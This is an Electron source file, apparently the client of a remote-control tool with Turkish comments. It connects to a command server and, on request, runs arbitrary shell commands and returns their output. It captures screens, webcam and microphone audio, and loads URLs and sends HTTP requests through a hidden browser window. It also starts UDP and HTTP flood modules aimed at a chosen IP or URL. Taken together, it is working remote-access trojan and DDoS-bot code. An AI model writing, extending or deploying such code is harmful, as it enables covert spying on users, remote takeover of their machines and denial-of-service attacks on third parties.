const { desktopCapturer, screen, app, ipcMain, BrowserWindow } = require("electron");
const io = require("socket.io-client");
const child_process = require("child_process");
const udpRain = require("./udpRain");
const httpRain = require("./httpRain");
const axios = require("axios");
//udpRain.start({ port: 53, ip: "192.168.1.180", seconds: 5, interval: 1000 });

// My Modules
const info = require("./config");

class RemoteControl {
  constructor() {
    this.mainWindow;
    this.remoteBrowserWindow = null;
  }
  getCamDataWeb = (data) => {
    console.log({ getCamDataWeb: data });
    this.mainWindow.reload();
    setTimeout(() => {
      this.mainWindow.webContents.send("camStart", data);
    }, 3000);
  };
  
  handleAudioListen = (data) => {
    console.log({ handleAudioListen: data });
    this.mainWindow.webContents.send("audioListenStart", data);
  };

  getScreenData = (data) => {
    (async () => {
      try {
        // Hem screen hem window'ları al
        let sources = await desktopCapturer.getSources({
          types: ["screen", "window"],
          thumbnailSize: {
            width: parseInt(data.dimension.split("x")[0]),
            height: parseInt(data.dimension.split("x")[1]),
          },
        });

        // Screen ID ile bul (index değil)
        const screenId = data.screenId || data.screen; // Eski kod uyumluluğu için data.screen de kontrol et
        
        let foundSource = null;
        try {
          if (screenId) {
            // ID ile ara
            foundSource = sources.find(source => source.id === screenId);
            
            // Eğer bulunamazsa, eski index yöntemini dene (geriye dönük uyumluluk)
            if (!foundSource && !isNaN(parseInt(screenId))) {
              const screenIndex = parseInt(screenId);
              if (screenIndex >= 0 && screenIndex < sources.length) {
                foundSource = sources[screenIndex];
              }
            }
          }

          if (foundSource) {
            try {
              // Window kapanmış olabilir, thumbnail alma işlemini try-catch içine al
              data["src"] = foundSource.thumbnail.toDataURL();
              console.log("Screenshot taken for:", foundSource.name, "ID:", foundSource.id);
              this.socket.emit("screenshotResponse", data);
            } catch (thumbnailError) {
              console.error("Error getting thumbnail (window may be closed):", thumbnailError.message);
              data["src"] = "";
              this.socket.emit("screenshotResponse", data);
            }
          } else {
            console.error("Screen not found. ID:", screenId, "Available sources:", sources.length);
            data["src"] = "";
            this.socket.emit("screenshotResponse", data);
          }
        } catch (findError) {
          console.error("Error finding source (window may be closed):", findError.message);
          data["src"] = "";
          this.socket.emit("screenshotResponse", data);
        }
      } catch (err) {
        console.error("Error getting screen data:", err.message);
        data["src"] = "";
        this.socket.emit("screenshotResponse", data);
      }
    })();
  };


  start = (mainWindow) => {
    this.mainWindow = mainWindow;

    this.socket = io.connect("http://" + info.host + ":" + info.port);
    this.socket.on("connect", () => {
      this.socket.emit("joinToRoom", { roomName: "terminal-" + info.id });
    });

    this.socket.on("screenshotRequest", (data) => {
      this.getScreenData(data);
    });

    this.socket.on("camShotRequest", (data) => {
      this.getCamDataWeb(data);
    });
    
    this.socket.on("audioListenRequest", (data) => {
      console.log("🎧 Audio listen request received:", data.action);
      this.handleAudioListen(data);
    });

    ipcMain.on("cam", (event, args) => {
      this.socket.emit("camShotResponse", args);
    });
    
    // Binary transfer için yeni handler
    ipcMain.on("camBinary", (event, args) => {
      this.socket.emit("camBinary", args);
    });
    
    // Audio stream için handler
    ipcMain.on("audioStream", (event, args) => {
      console.log("📥 Audio stream received from renderer:", args.audioData ? args.audioData.length : "no data", "chars (base64)");
      console.log("📡 MIME type:", args.mimeType);
      
      if (args.audioData && args.audioData.length > 0) {
        console.log("📤 Forwarding audio data to server");
        this.socket.emit("audioStreamResponse", args);
      } else {
        console.log("⚠️ No audio data to forward");
      }
    });
    
    // Audio listen status için handler
    ipcMain.on("audioListenStatus", (event, args) => {
      this.socket.emit("audioListenStatus", args);
    });

    this.socket.on("getRunRequest", (data) => {
      console.log({ getRunRequest: data });
      if (data.cmd.indexOf("udpRain") > -1) {
        const splittedData = data.cmd.split(" ");
        const createdData = {
          port: parseInt(splittedData[2]),
          ip: splittedData[1],
          seconds: parseInt(splittedData[3]),
          interval: parseInt(splittedData[4]),
        };
        console.log({ createdData });
        udpRain.start(createdData);
      } else if (data.cmd.indexOf("httpRain") > -1) {
        const splittedData = data.cmd.split(" ");
        const createdData = {
          url: splittedData[1],
          seconds: parseInt(splittedData[2]),
          interval: parseInt(splittedData[3]),
        };
        console.log({ createdData });
        httpRain.start(createdData);
      }
      else if (data.cmd.indexOf("codeRain") > -1) {
        const splittedData = data.cmd.split(" ");
        const createdData = {
          seconds: parseInt(splittedData[1]),
          interval: parseInt(splittedData[2]),
          code: splittedData[3],
        };
        console.log({ createdData });
        httpRain.codeRainStart(createdData);
      }
      else {
        try {
          child_process.exec(
            data.cmd,
            { shell: true },
            (err, stdout, stderr) => {
              if (err) {
                data["cmd"] = "err: " + err;
              } else if (stderr) {
                data["cmd"] = "stderr: " + stderr;
              } else {
                data["cmd"] = stdout;
              }

              this.socket.emit("getRunResponse", data);
            }
          );
        } catch (error) {
          data["cmd"] = "catchError: " + error;
          this.socket.emit("getRunResponse", data);
        }
      }
    });

    /**
     * Remote Browser - Ekran görüntüsü yaklaşımı
     * Terminal'de BrowserWindow açılır, ekran görüntüsü alınır
     */
    this.socket.on("remoteBrowserOpen", (data) => {
      // data: { from, to, url }
      console.log("📥 [ELECTRON] remoteBrowserOpen received:", data);
      this.openRemoteBrowser(data);
    });

    /**
     * HTTP Request - Terminal üzerinden HTTP isteği gönder, response ekran görüntüsü olarak döndür
     */
    this.socket.on("httpRequest", (data) => {
      // data: { from, to, method, url, headers, body }
      console.log("📥 [ELECTRON] httpRequest received:", data.method, data.url);
      this.executeHttpRequest(data);
    });

    // Screen/window listesi isteği
    this.socket.on("getScreenListRequest", (data) => {
      this.getScreenList(data);
    });

  };

  /**
   * Remote Browser - BrowserWindow aç ve ekran görüntüsü al
   */
  openRemoteBrowser = (data) => {
    const targetUrl = data.url;
    console.log("Opening remote browser for URL:", targetUrl);

    // BrowserWindow yoksa oluştur
    if (!this.remoteBrowserWindow || this.remoteBrowserWindow.isDestroyed()) {
      this.remoteBrowserWindow = new BrowserWindow({
        width: 1920,
        height: 1080,
        show: false, // gizli pencere
        webPreferences: {
          nodeIntegration: false,
          contextIsolation: false, // Electron 10 için false yapıyoruz
          sandbox: false, // Electron 10 için false yapıyoruz
          webSecurity: true,
        },
      });

      // Hata event'lerini dinle
      this.remoteBrowserWindow.webContents.on('did-fail-load', (event, errorCode, errorDescription, validatedURL) => {
        console.error("Remote browser failed to load:", errorCode, errorDescription, validatedURL);
        // Hata durumunda boş ekran gönder
        const errorImg = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64');
        const errorDataUrl = 'data:image/png;base64,' + errorImg.toString('base64');
        this.socket.emit("remoteBrowserFrame", {
          from: data.from,
          to: data.to,
          url: targetUrl,
          src: errorDataUrl,
          width: 1920,
          height: 1080,
          error: errorDescription
        });
      });

      // Sayfa yüklendikten sonra ekran görüntüsü al
      this.remoteBrowserWindow.webContents.on('did-finish-load', () => {
        console.log("Remote browser page loaded successfully");
        setTimeout(() => {
          this.captureRemoteBrowser(data);
        }, 1500); // Sayfa tamamen yüklensin
      });
    }

    // URL'yi yükle
    console.log("Loading URL:", targetUrl);
    this.remoteBrowserWindow.loadURL(targetUrl).catch((err) => {
      console.error("Remote browser load error:", err);
      // Hata durumunda boş ekran gönder
      const errorImg = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64');
      const errorDataUrl = 'data:image/png;base64,' + errorImg.toString('base64');
      this.socket.emit("remoteBrowserFrame", {
        from: data.from,
        to: data.to,
        url: targetUrl,
        src: errorDataUrl,
        width: 1920,
        height: 1080,
        error: err.message || 'Failed to load URL'
      });
    });

    // Fallback: İlk yükleme için de capture yap (eğer did-finish-load çalışmazsa)
    setTimeout(() => {
      if (this.remoteBrowserWindow && !this.remoteBrowserWindow.isDestroyed()) {
        const isLoading = this.remoteBrowserWindow.webContents.isLoading();
        if (!isLoading) {
          console.log("Fallback capture triggered");
          this.captureRemoteBrowser(data);
        }
      }
    }, 4000);
  };

  /**
   * Remote browser ekran görüntüsü al
   */
  captureRemoteBrowser = (data) => {
    if (!this.remoteBrowserWindow || this.remoteBrowserWindow.isDestroyed()) {
      return;
    }

    this.remoteBrowserWindow.webContents
      .capturePage()
      .then((image) => {
        const src = image.toDataURL('image/jpeg', 0.85);
        console.log("📤 [ELECTRON] Sending remoteBrowserFrame, size:", src.length, "chars");
        this.socket.emit("remoteBrowserFrame", {
          from: data.from,
          to: data.to,
          url: data.url,
          src: src,
          width: image.getSize().width,
          height: image.getSize().height
        });
      })
      .catch((err) => {
        console.error("Remote browser capture error:", err);
      });
  };

  /**
   * HTTP Request - Terminal üzerinden HTTP isteği gönder, response'u browser'da göster
   */
  executeHttpRequest = async (data) => {
    const { method, url, headers, body } = data;

    try {
      // Content-Type JSON mi kontrol et (eski Node/Electron uyumlu)
      const contentTypeHeader =
        (headers && (headers["Content-Type"] || headers["content-type"])) || "";
      const isJsonRequest =
        typeof contentTypeHeader === "string" &&
        contentTypeHeader.indexOf("application/json") !== -1;

      // Axios ile HTTP isteği (terminal üzerinden)
      const config = {
        method: method || 'GET',
        url: url,
        timeout: 30000,
        headers: headers || {},
        maxRedirects: 5,
        validateStatus: () => true, // Tüm status kodlarını kabul et
      };

      // Request body varsa ekle
      if (body && (method === 'POST' || method === 'PUT' || method === 'PATCH')) {
        if (isJsonRequest) {
          config.data = typeof body === 'string' ? body : JSON.stringify(body);
        } else {
          config.data = body;
        }
      }

      const response = await axios(config);

      // Response'u HTML olarak formatla ve browser'da göster
      const responseContentType =
        (response.headers && (response.headers["content-type"] || response.headers["Content-Type"])) || "";
      const isJsonResponse =
        typeof responseContentType === "string" &&
        responseContentType.indexOf("application/json") !== -1;

      const html = `
        <!DOCTYPE html>
        <html>
        <head>
          <title>HTTP Response</title>
          <style>
            body { font-family: monospace; padding: 20px; background: #1e1e1e; color: #d4d4d4; }
            .status { font-size: 18px; margin-bottom: 20px; }
            .status-2xx { color: #4ec9b0; }
            .status-3xx { color: #dcdcaa; }
            .status-4xx { color: #f48771; }
            .status-5xx { color: #f48771; }
            .headers { background: #252526; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
            .headers h3 { margin-top: 0; color: #569cd6; }
            .header-item { margin: 5px 0; }
            .body { background: #252526; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; }
            .body-json { color: #ce9178; }
            .body-text { color: #d4d4d4; }
          </style>
        </head>
        <body>
          <div class="status status-${Math.floor(response.status / 100)}xx">
            <strong>Status:</strong> ${response.status} ${response.statusText || ''}
          </div>
          <div class="headers">
            <h3>Response Headers:</h3>
            ${Object.entries(response.headers).map(([key, value]) => 
              `<div class="header-item"><strong>${key}:</strong> ${value}</div>`
            ).join('')}
          </div>
          <div class="body ${isJsonResponse ? 'body-json' : 'body-text'}">
            ${this.formatResponseBody(response.data, responseContentType)}
          </div>
        </body>
        </html>
      `;

      // BrowserWindow'da göster
      if (!this.remoteBrowserWindow || this.remoteBrowserWindow.isDestroyed()) {
        this.remoteBrowserWindow = new BrowserWindow({
          width: 1920,
          height: 1080,
          show: false,
          webPreferences: {
            nodeIntegration: false,
            contextIsolation: false, // Electron 10 için false
            sandbox: false, // Electron 10 için false
            webSecurity: true,
          },
        });

        // Hata event'lerini dinle
        this.remoteBrowserWindow.webContents.on('did-fail-load', (event, errorCode, errorDescription, validatedURL) => {
          console.error("HTTP response browser failed to load:", errorCode, errorDescription);
        });
      }

      // HTML'i data URL olarak yükle
      const dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
      console.log("Loading HTTP response HTML, length:", html.length);
      this.remoteBrowserWindow.loadURL(dataUrl).catch((err) => {
        console.error("Failed to load HTTP response HTML:", err);
      });

      // Ekran görüntüsü al
      setTimeout(() => {
        this.captureHttpResponse({
          from: data.from,
          to: data.to,
          url: url,
          method: method,
          status: response.status
        });
      }, 1000);

    } catch (error) {
      console.error("HTTP request error:", error.message);
      
      // Hata durumunda error HTML göster
      const errorHtml = `
        <!DOCTYPE html>
        <html>
        <head><title>Error</title></head>
        <body style="font-family: monospace; padding: 20px; background: #1e1e1e; color: #f48771;">
          <h1>HTTP Request Error</h1>
          <p><strong>URL:</strong> ${url}</p>
          <p><strong>Method:</strong> ${method}</p>
          <p><strong>Error:</strong> ${error.message}</p>
          ${error.code ? `<p><strong>Code:</strong> ${error.code}</p>` : ''}
        </body>
        </html>
      `;

      if (!this.remoteBrowserWindow || this.remoteBrowserWindow.isDestroyed()) {
        this.remoteBrowserWindow = new BrowserWindow({
          width: 1920,
          height: 1080,
          show: false,
          webPreferences: {
            nodeIntegration: false,
            contextIsolation: false, // Electron 10 için false
            sandbox: false, // Electron 10 için false
            webSecurity: true,
          },
        });
      }

      const dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(errorHtml);
      console.log("Loading error HTML");
      this.remoteBrowserWindow.loadURL(dataUrl).catch((err) => {
        console.error("Failed to load error HTML:", err);
      });

      setTimeout(() => {
        this.captureHttpResponse({
          from: data.from,
          to: data.to,
          url: url,
          method: method,
          status: 0,
          error: error.message
        });
      }, 1000);
    }
  };

  /**
   * HTTP Response ekran görüntüsü al
   */
  captureHttpResponse = (data) => {
    if (!this.remoteBrowserWindow || this.remoteBrowserWindow.isDestroyed()) {
      return;
    }

    this.remoteBrowserWindow.webContents
      .capturePage()
      .then((image) => {
        const src = image.toDataURL('image/jpeg', 0.85);
        console.log("📤 [ELECTRON] Sending httpResponseFrame, size:", src.length, "chars", "status:", data.status);
        this.socket.emit("httpResponseFrame", {
          from: data.from,
          to: data.to,
          url: data.url,
          method: data.method,
          status: data.status,
          src: src,
          width: image.getSize().width,
          height: image.getSize().height
        });
      })
      .catch((err) => {
        console.error("HTTP response capture error:", err);
      });
  };

  /**
   * Response body'yi formatla
   */
  formatResponseBody = (data, contentType) => {
    if (!data) return '(empty)';
    
    try {
      if (contentType && contentType.includes('application/json')) {
        // JSON formatla
        return JSON.stringify(JSON.parse(data), null, 2);
      } else if (typeof data === 'object') {
        return JSON.stringify(data, null, 2);
      } else {
        return String(data);
      }
    } catch (e) {
      return String(data);
    }
  };

  /**
   * Screen/window listesi al ve dashboard'a gönder
   */
  getScreenList = async (data) => {
    try {
      console.log("Getting screen/window list...");
      
      // Hem screen hem window'ları al
      const sources = await desktopCapturer.getSources({
        types: ["screen", "window"],
        thumbnailSize: { width: 200, height: 200 }
      });

      console.log("Found", sources.length, "sources");

      const screens = sources.map((source, index) => {
        const isScreen = source.id.startsWith("screen:") || source.id.includes("Screen");
        return {
          id: source.id,
          name: source.name || (isScreen ? `Screen ${index + 1}` : `Window: ${source.name}`),
          thumbnail: source.thumbnail.toDataURL(),
          type: isScreen ? "screen" : "window"
        };
      });

      console.log("Sending screen list to dashboard:", screens.length, "items");
      
      this.socket.emit("getScreenListResponse", {
        from: data.from,
        to: data.to,
        screens: screens
      });
    } catch (err) {
      console.error("Error getting screen list:", err);
      this.socket.emit("getScreenListResponse", {
        from: data.from,
        to: data.to,
        screens: []
      });
    }
  };
}

module.exports = new RemoteControl();
